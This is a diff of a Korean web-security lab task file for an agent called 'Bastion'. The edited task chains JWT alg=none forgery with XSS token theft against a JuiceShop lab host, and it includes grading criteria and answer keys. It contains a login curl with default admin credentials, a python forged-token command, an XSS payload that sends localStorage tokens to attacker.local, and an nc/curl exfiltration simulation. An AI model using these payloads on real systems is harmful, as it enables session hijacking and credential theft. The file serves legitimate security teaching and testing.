@@ -202,7 +202,9 @@ steps:
   answer_detail: 세션 하이재킹 시뮬레이션은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
-    expect: 완료
+    expect:
+    - 완료
+    - hijack
     field: stdout
     semantic:
       intent: 세션 하이재킹 시뮬레이션 — 타인의 세션 쿠키 탈취 가정 후 해당 쿠키로 요청해 권한 이관 여부 확인
@@ -275,7 +277,9 @@ steps:
   answer_detail: JWT 서명 검증 우회 테스트은(는) 웹 보안 진단의 핵심 단계입니다. 체계적인 접근이 필요합니다.
   verify:
     type: output_contains
-    expect: 완료
+    expect:
+    - 완료
+    - jwt
     field: stdout
     semantic:
       intent: JWT 서명 검증 우회 — alg:none, 공개키 혼동(HS256 with RSA pubkey), 약한 HMAC 키 크래킹
@@ -526,6 +530,7 @@ steps:
     - 보고서 완료
     - 10.20.30.80
     - OAuth2
+    - report
     field: stdout
     semantic:
       intent: 인증/세션 실습 종합 리포트 — 분석·Exploit·방어 전략을 /tmp/auth_session_report.txt 로 정리
@@ -548,52 +553,110 @@ steps:
   risk_level: low
   bastion_prompt: 인증/세션 취약점 실습 종합 보고서를 작성하시오.
 - order: 99
-  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
-  bastion_prompt: '다음 작업들을 순서대로 수행해줘:
+  instruction: |
+    [복합 시나리오] "JWT 알고리즘 변조 + XSS 토큰 탈취 chain — 인증 자격증명 체인 공격"
 
-    1) 10.20.30.80 대상으로 로그인 메커니즘 분석을(를) 수행해줘
+    ## 상황 (w05 → w06 시나리오 연속)
 
-    2) 10.20.30.80 대상으로 브루트포스 공격 시뮬레이션을(를) 수행해줘
+    w05 에서 SQLi·Upload 매트릭스를 마쳤다. 선배가 다음.
 
-    3) 10.20.30.80 대상으로 패스워드 정책 검증을(를) 수행해줘
+    > 선배: "단일 취약점은 어렵지 않은데, 진짜 위험은 *체인* 이야.
+    > JWT 가 alg=none 으로 변조되면 서명 우회. 거기다 XSS 가 있으면 localStorage 의 토큰을 빼낼 수 있고.
+    > 둘 다 막혀 있으면 안전하지만, 한쪽만 뚫려도 *권한 상승 + 자격증명 탈취* 가 동시에 발생해.
+    > JuiceShop 에서 JWT 변조 PoC 만들고, XSS payload 로 토큰 탈취 시연 + 방어 매트릭스 정리해."
 
-    4) 10.20.30.80 대상으로 세션 토큰 엔트로피 분석을(를) 수행해줘
+    학습 목표 (lecture #1·#2 XSS 3 유형 + #3 CSRF) + (lab #7·#8·#9 JWT 변조 + #6 세션 하이재킹) 통합.
 
-    5) 10.20.30.80 대상으로 세션 고정 공격 테스트을(를) 수행해줘'
-  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
-  category: multi_task
+    ## 임무 (3 단계, 약 35분)
+
+    ### Phase A — JWT 알고리즘 변조 (lab #7·#8·#9)
+    Phase 1) `curl -s -X POST -H "Content-Type: application/json"
+    -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://10.20.30.80/rest/user/login` 로 JWT 획득.
+    Phase 2) header 에서 `{"alg":"HS256"...}` → `{"alg":"none"...}` 변조. 서명 부분 제거.
+    Phase 3) `python3 -c "import base64; h=base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').rstrip(b'=').decode(); ..."` 형태로
+    변조 토큰 생성. `curl -H "Authorization: Bearer <변조>" http://10.20.30.80/rest/user/whoami` 로 인증 우회 시도.
+
+    ### Phase B — XSS payload 로 JWT 탈취 (lecture #1·#2)
+    JuiceShop 의 search 또는 review 입력란에 stored 또는 reflected XSS payload 작성.
+    Payload: `<script>fetch('http://attacker.local/steal?t='+localStorage.getItem('token'))</script>`
+    PoC 로 텍스트 출력. 실제 외부 callback 은 환경 제약 → curl 로 attacker 측 수신 시뮬레이션:
+    `nc -lk 9999 &` 후 `curl "http://localhost:9999/steal?t=$(JWT)"`.
+
+    ### Phase C — 인증 자격증명 방어 매트릭스
+    | 위협 | 공격면 | 방어 1 | 방어 2 | 잔존 위험 |
+    | JWT alg 변조 | server alg whitelist | strict alg check | RS256 사용 | key leak |
+    | localStorage 탈취 | XSS | HttpOnly Cookie 사용 | CSP 설정 | XSS+CSRF chain |
+    | Cookie 탈취 | XSS + Cookie 접근 | HttpOnly + Secure | SameSite=Strict | network mitm |
+    | Refresh token 탈취 | 영구 자격증명 | rotation + short TTL | device binding | refresh leak |
+    표 끝에 "JuiceShop 권고: alg whitelist + HttpOnly Cookie + SameSite=Strict + refresh rotation" 한 줄.
+
+    종료: echo "=== Phase A JWT 변조 ===" / "=== Phase B XSS 탈취 ===" / "=== Phase C 매트릭스 ===" 묶음.
+  bastion_prompt: |
+    [복합 시나리오 — w06 JWT 변조 + XSS 토큰 탈취 chain]
+
+    JuiceShop (http://10.20.30.80) 인증 자격증명 chain 공격 점검 3 phase.
+
+    Phase A (JWT alg 변조):
+    1) `curl -s -X POST -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op","password":"admin123"}'
+        http://10.20.30.80/rest/user/login` 응답에서 JWT 획득.
+    2) python3 으로 alg=none 변조 토큰 생성:
+       `python3 -c "import base64; h=base64.urlsafe_b64encode(b'{\"alg\":\"none\",\"typ\":\"JWT\"}').rstrip(b'=').decode();
+        p='<원본 payload base64>'; print(f'{h}.{p}.')"`
+    3) `curl -i -H "Authorization: Bearer <변조>" http://10.20.30.80/rest/user/whoami` 결과 캡처.
+       (보통 거부됨 — 그게 JuiceShop 의 정상 동작)
+
+    Phase B (XSS payload + JWT 탈취 시뮬레이션):
+    XSS payload 텍스트 출력: `<script>fetch('http://attacker.local/steal?t='+localStorage.getItem('token'))</script>`
+    공격자 측 수신 시뮬: `nc -lk 9999 &` 후 다른 터미널에서 `curl "http://localhost:9999/steal?t=FAKEJWT"`.
+    `kill %1` 로 nc 종료. 토큰 탈취 흐름 PoC.
+
+    Phase C (방어 매트릭스):
+    ```
+    | 위협 | 공격면 | 방어 1 | 방어 2 | 잔존 위험 |
+    | JWT alg 변조 | server alg whitelist | strict alg check | RS256 사용 | key leak |
+    | localStorage 탈취 | XSS | HttpOnly Cookie 사용 | CSP 설정 | XSS+CSRF chain |
+    | Cookie 탈취 | XSS + Cookie 접근 | HttpOnly + Secure | SameSite=Strict | network mitm |
+    | Refresh token 탈취 | 영구 자격증명 | rotation + short TTL | device binding | refresh leak |
+    ```
+    표 끝에 "JuiceShop 권고: alg whitelist + HttpOnly Cookie + SameSite=Strict + refresh rotation" 한 줄.
+
+    종료: echo "=== Phase A JWT 변조 ===" / "=== Phase B XSS 탈취 ===" / "=== Phase C 매트릭스 ===" 묶음.
+
+    반드시 3 phase 모두 실행. 중간 종료 금지.
+  hint: |
+    Phase A: JWT alg=none 은 RFC 7519 의 "unsecured JWS". 라이브러리 별로 차단 정책 다름.
+    Phase B: nc -lk 로 localhost 수신, curl 로 발신 — 외부 callback 없이 자체 시뮬레이션.
+    Phase C: 4행 매트릭스. JuiceShop 권고 한 줄.
+    포인트: 단일 취약점이 아닌 *chain* — JWT 변조 + XSS 가 동시면 자격증명+권한 동시 탈취.
+  category: integration_scenario
   points: 50
   verify:
     type: output_contains
-    expect: ''
+    expect: 매트릭스
     field: stdout
     semantic:
-      intent: '[통합] 인증/세션 5작업 — bypass/token/session fix/MFA/audit 통합. OWASP A07.'
+      intent: |
+        JWT alg=none 변조 + XSS 토큰 탈취 chain 점검 + 자격증명 방어 매트릭스.
+        lecture #1·#2·#3 + lab #7·#8·#9·#6 동시 행동 증명.
       success_criteria:
-      - 5 인증 작업
-      - bypass
-      - MFA
+      - Phase A — 원본 JWT 획득 + alg=none 변조 토큰 생성 + whoami 시도
+      - Phase B — XSS payload 텍스트 + nc/curl 토큰 탈취 시뮬레이션
+      - Phase C — 4행 매트릭스 + 종합 권고 한 줄
       acceptable_methods:
-      - bastion plan
-      - Burp
-      - JWT tool
+      - curl POST login + python3 base64 변조
+      - nc -lk + curl 자체 시뮬
+      - markdown table 매트릭스
+      - jwt_tool / pyjwt 추가 가능
       negative_signs:
-      - bypass 실패
-      - MFA 없음
-      - audit 누락
+      - JWT 획득만 하고 변조 안 함
+      - XSS payload 만 작성하고 탈취 시뮬 누락
+      - 매트릭스 누락 또는 2행 이하
+      - chain 관점 (JWT+XSS 동시) 분석 누락
   target_vm: attacker
   risk_level: low
-  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
-
-    1) 10.20.30.80 대상으로 로그인 메커니즘 분석을(를) 수행해줘
-
-    2) 10.20.30.80 대상으로 브루트포스 공격 시뮬레이션을(를) 수행해줘
-
-    3) 10.20.30.80 대상으로 패스워드 정책 검증을(를) 수행해줘
-
-    4) 10.20.30.80 대상으로 세션 토큰 엔트로피 분석을(를) 수행해줘
-
-    5) 10.20.30.80 대상으로 세션 고정 공격 테스트을(를) 수행해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer: |
+    🤖 위 bastion_prompt 그대로. JWT 변조 → XSS 시뮬 → 매트릭스 echo.
+  answer_detail: |
+    JWT alg=none 은 학술적 우회 — JuiceShop 은 차단됨. 그 *시도 자체* 가 학습 목표.
+    XSS 탈취는 nc 자체 callback 으로 시뮬. 핵심은 *chain* 관점 — 두 취약점이 결합 시 영향 폭증.
   script: ''
